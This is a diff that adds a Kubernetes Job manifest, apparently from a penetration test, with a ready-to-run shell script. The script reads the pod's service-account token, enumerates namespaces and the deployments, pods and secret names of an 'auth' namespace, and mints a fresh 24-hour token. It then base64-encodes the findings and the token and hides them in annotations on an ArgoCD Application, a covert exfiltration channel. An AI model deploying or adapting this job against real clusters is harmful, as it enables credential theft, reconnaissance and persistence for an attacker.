@@ -1,0 +1,50 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: authrecon
+  namespace: pentest-1344
+  labels:
+    purpose: pentest-1344
+spec:
+  backoffLimit: 0
+  ttlSecondsAfterFinished: 86400
+  template:
+    metadata:
+      labels:
+        purpose: pentest-1344
+    spec:
+      serviceAccountName: probe1344
+      restartPolicy: Never
+      containers:
+      - name: c
+        image: curlimages/curl:8.10.1
+        command: ["/bin/sh","-c"]
+        args:
+        - |
+          API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
+          CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          OUT=/tmp/out.txt
+          : > $OUT
+          {
+            echo "## namespaces"
+            curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" "$API/api/v1/namespaces" | tr ',' '\n' | grep '"name"' | sed 's/.*"name": *"//;s/".*//' | sort -u
+            echo "## deployments-auth"
+            curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" "$API/apis/apps/v1/namespaces/auth/deployments" | tr '{' '\n' | grep -E '"(name|image)"' | head -80
+            echo "## pods-auth"
+            curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" "$API/api/v1/namespaces/auth/pods" | tr '{' '\n' | grep -E '"(name|nodeName)"' | head -80
+            echo "## secrets-auth-names"
+            curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" "$API/api/v1/namespaces/auth/secrets" | tr '{' '\n' | grep '"name"' | sed 's/.*"name": *"//;s/".*//' | head -80
+            echo "## auth-deploy-env-names"
+            curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" "$API/apis/apps/v1/namespaces/auth/deployments" | grep -o '"name":"[^"]*"' | head -80
+            echo "## tokenrequest"
+            TR=$(curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST "$API/api/v1/namespaces/pentest-1344/serviceaccounts/probe1344/token" -d '{"spec":{"audiences":["https://kubernetes.default.svc"],"expirationSeconds":86400}}')
+            NEWTOK=$(printf '%s' "$TR" | sed -n 's/.*"token"[ ]*:[ ]*"\([^"]*\)".*/\1/p')
+            echo "NEWTOK_LEN=${#NEWTOK}"
+          } >> $OUT 2>&1
+          B64=$(base64 $OUT | tr -d '\n')
+          TB64=$(printf '%s' "$NEWTOK" | base64 | tr -d '\n')
+          PATCH="{\"metadata\":{\"annotations\":{\"p1344.recon\":\"$B64\",\"p1344.token\":\"$TB64\"}}}"
+          curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/merge-patch+json" -X PATCH "$API/apis/argoproj.io/v1alpha1/namespaces/argocd/applications/p1344" -d "$PATCH" >/dev/null
+          echo DONE
+      volumes: []
